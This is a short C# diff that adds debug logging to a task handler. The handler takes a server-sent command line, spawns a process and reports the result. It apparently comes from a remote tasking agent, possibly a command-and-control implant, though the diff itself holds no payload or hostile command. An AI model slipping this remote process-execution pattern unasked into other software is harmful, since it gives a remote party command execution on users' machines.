@@ -18,10 +18,12 @@ namespace Workflow
 
         public async Task Execute(ServerJob job)
         {
+            DebugLog.Log($"Executing {Name} [{job.task.id}]");
             ExecArgs args = JsonSerializer.Deserialize<ExecArgs>(job.task.parameters);
 
             if(args is null)
             {
+                DebugLog.Log($"{Name} args is null [{job.task.id}]");
                 messageManager.AddTaskResponse(new TaskResponse()
                 {
                     task_id = job.task.id,
@@ -33,6 +35,7 @@ namespace Workflow
 
             if (string.IsNullOrEmpty(args.commandline))
             {
+                DebugLog.Log($"{Name} missing commandline [{job.task.id}]");
                 messageManager.AddTaskResponse(new TaskResponse()
                 {
                     task_id = job.task.id,
@@ -42,6 +45,7 @@ namespace Workflow
                 return;
             }
 
+            DebugLog.Log($"{Name} spawning process [{job.task.id}]");
             if (await this.spawner.Spawn(args.getSpawnOptions(job.task.id)))
             {
                 messageManager.AddTaskResponse(new TaskResponse()
@@ -50,6 +54,7 @@ namespace Workflow
                     user_output = "Process Spawned",
                     completed = true
                 });
+                DebugLog.Log($"{Name} completed [{job.task.id}]");
                 return;
             }
         }
